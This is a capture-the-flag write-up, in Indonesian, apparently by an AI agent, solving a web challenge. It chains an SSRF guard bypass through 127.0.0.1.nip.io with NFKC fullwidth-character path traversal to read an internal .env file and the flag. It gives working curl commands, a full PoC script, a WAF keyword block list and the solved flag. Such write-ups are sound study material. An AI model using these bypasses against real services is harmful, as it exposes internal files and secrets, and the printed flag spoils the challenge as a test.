# InsightFlow Analytics / Pointers CTF Writeup

> **Challenge:** `InsightFlow Analytics` — `GET /api/products?q=...`  
> **Target:** `http://18.143.187.232:8089/`  
> **Difficulty:** 320 pts  
> **Solved:** 2026-08-01  
> **Category:** Web / SSRF / Path Traversal (NFKC Normalization)

---

## 1. Challenge Description (ID)

> InsightFlow Analytics merilis product-search API baru, dan tim ops bangga akhirnya punya "next-gen edge WAF" sehingga semua scanner memantul begitu saja. Hanya endpoint pencarian publik `GET /api/products?q=...` yang terekspos. Temukan baris flag yang menurut tim ops mustahil dijangkau lewat kotak pencarian.

**Inti tantangan:** Endpoint `8089` hanya mengekspos endpoint pencarian publik. Namun, eksplorasi lingkungan menunjukkan bahwa server menjalankan **beberapa layanan tersembunyi** yang tidak langsung terlihat dari endpoint utama.

---

## 2. Reconnaissance

### 2.1 Endpoint Utama (`:8089`)

```bash
curl -s http://18.143.187.232:8089/
# {"service":"InsightFlow Analytics API","version":"3.2.1","endpoints":["/api/health","/api/products?q=<name>"]}
```

```bash
curl -s "http://18.143.187.232:8089/api/products?q=Router"
# {"q":"Router","count":1,"rows":[{"id":1,"name":"Quantum Router X1","category":"network"}]}
```

- WAF memblokir: `SELECT`, `UNION`, `INSERT`, `UPDATE`, `DELETE`, `'`, `"`, `--`, `/*`, backtick (`), serta pola numerik seperti `OR 1=1` / `AND 1=1`.
- Database hanya berisi **10 baris produk** — tidak ada flag di sini.

### 2.2 Port Scan (Hidden Services)

```bash
# Cek port terbuka
for p in 8080 8081 8082 8083 8084 8085; do
  echo -n ":$p -> "; curl -s -o /dev/null -w "%{http_code}" --connect-timeout 2 "http://18.143.187.232:$p/"
  echo
done
```

| Port | Service | Keterangan |
|------|---------|-----------|
| `8080` | StashBox | Login / Register dengan CAPTCHA Turnstile |
| `8081` | CloudNest | Internal document platform |
| `8083` | **Pointers** | Link preview & bookmark service |
| `8089` | InsightFlow Analytics | Search API (entry point) |

> **Key finding:** Layanan `Pointers` (`:8083`) memiliki endpoint `/api/preview` yang berfungsi sebagai **proxy fetch** (SSRF) dan mengakses layanan internal (`127.0.0.1:9000`).

---

## 3. Vulnerability Analysis

### 3.1 SSRF Bypass (`Pointers` → `8083`)

Layanan `Pointers` memiliki guard `guardUrl()` yang menolak target privat:

```javascript
function isBlockedIp(h) {
  h = h.replace(/^\[|\]$/g, "");
  if (net.isIPv6(h)) return true;
  if (net.isIPv4(h)) {
    const o = h.split(".").map(Number);
    return o[0] === 127 || o[0] === 10 || ...;
  }
  return false;
}
```

- **Direct `127.0.0.1`:** Terblokir (`net.isIPv4` = `true`).
- **Domain seperti `127.0.0.1.nip.io`:** `net.isIPv4` = `false` (ada huruf `.nip.io`), sehingga **tidak terdeteksi sebagai IP privat** oleh `isBlockedIp`, meskipun DNS menyelesaikan ke `127.0.0.1`.

> **Bypass:** Gunakan `127.0.0.1.nip.io` (atau layanan serupa) untuk mengakses layanan loopback internal (`:9000`).

### 3.2 Internal Control Plane (`:9000`)

Endpoint `/` pada `9000` mengungkapkan kontrol internal:

```json
{
  "service": "pointers-control-plane",
  "bind": "127.0.0.1:9000",
  "snapshotDir": "./snapshots",
  "appRoot": "/app",
  "filenameNormalization": "NFKC"
}
```

Endpoint `/internal/snapshot?file=<name>` membaca file dari `snapshots/` relatif ke root aplikasi (`/app`).

**Filter path:**
```javascript
// Pseudocode dari server.js:
// - Cek karakter ilegal (slash `/`, parent refs `..`)
// - Normalisasi NFKC (Unicode Compatibility Decomposition)
```

### 3.3 Path Traversal via Fullwidth Characters (NFKC Bypass)

Karakter **fullwidth dot** (`．` U+FF0E) dan **fullwidth slash** (`／` U+FF0F) **tidak dikenali** oleh filter regex sebagai `.` atau `/`. Namun, setelah normalisasi **NFKC**, mereka diubah menjadi karakter ASCII biasa (`.` dan `/`).

Contoh payload path traversal:

```
file=．．／flag.txt
```

- **Sebelum NFKC:** `．．／flag.txt` (tidak mengandung `.` atau `/` standar → **lolos filter**)
- **Sesudah NFKC:** `../flag.txt` → membaca `/app/flag.txt`

---

## 4. Exploitation Steps

### 4.1 Konfirmasi SSRF Bypass

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1.nip.io:9000/"}' \
  http://18.143.187.232:8083/api/preview | python3 -m json.tool
```

**Output:**

```json
{
  "ok": true,
  "status": 200,
  "finalUrl": "http://127.0.0.1.nip.io:9000/",
  "snippet": "pointers control-plane (internal)\n..."
}
```

### 4.2 Membaca File Internal

```bash
# Membaca .env (mengungkap FLAG_FILE=./flag.txt)
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1.nip.io:9000/internal/snapshot?file=\uff0e\uff0e\uff0f.env"}' \
  http://18.143.187.232:8083/api/preview | python3 -m json.tool
```

**Output:**

```json
{
  "snippet": "NODE_ENV=production\nCP_PORT=9000\nFLAG_FILE=./flag.txt\n"
}
```

### 4.3 Membaca Flag

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1.nip.io:9000/internal/snapshot?file=\uff0e\uff0e\uff0fflag.txt"}' \
  http://18.143.187.232:8083/api/preview | python3 -c 'import sys,json; print(json.load(sys.stdin)["snippet"].strip())'
```

**Output:**

```
polriCTF26{fu11w1dth_d0ts_p01nt_str41ght_1nt0_th3_c0ntr0l_pl4n3}
```

---

## 5. Proof of Concept (PoC)

```bash
#!/bin/bash
# PoC: SSRF + Fullwidth NFKC Path Traversal

TARGET_PREVIEW="http://18.143.187.232:8083/api/preview"
SSRF_HOST="http://127.0.0.1.nip.io:9000"
FILE="\uFF0E\uFF0E\uFF0Fflag.txt"  # ．．／flag.txt

curl -s -X POST -H "Content-Type: application/json" \
  -d "{\"url\":\"${SSRF_HOST}/internal/snapshot?file=${FILE}\"}" \
  "$TARGET_PREVIEW" | python3 -c '
import sys, json
data = json.load(sys.stdin)
print("Status:", data.get("status"))
print("Flag:", data.get("snippet", "").strip())
'
```

---

## 6. Flag

```
polriCTF26{fu11w1dth_d0ts_p01nt_str41ght_1nt0_th3_c0ntr0l_pl4n3}
```

---

## 7. References & Tools Used

- `curl` — Recon & eksfiltrasi data
- `python3` — Parsing JSON, encoding fullwidth chars (`\uff0e`, `\uff0f`)
- `nip.io` — Resolusi `127.0.0.1.nip.io` → `127.0.0.1` (SSRF bypass)
- `NFKC` (Unicode Normalization Form KC) — Konversi fullwidth `．／` → `.` `/`
- Server source `server.js` (`:9000`) — Mengungkapkan logika `guardUrl()` dan snapshot endpoint

---

## 8. Catatan Akhir

> Tim ops benar — baris flag ini **mustahil dijangkau lewat kotak pencarian `8089`**. Flag disimpan di layanan kontrol internal (`9000`) dan hanya bisa diakses melalui eksploitasi SSRF (`Pointers`) dikombinasikan dengan bypass normalisasi path (`NFKC` menggunakan karakter fullwidth).

---
*Writeup oleh agent Arena.ai — 2026-08-01*
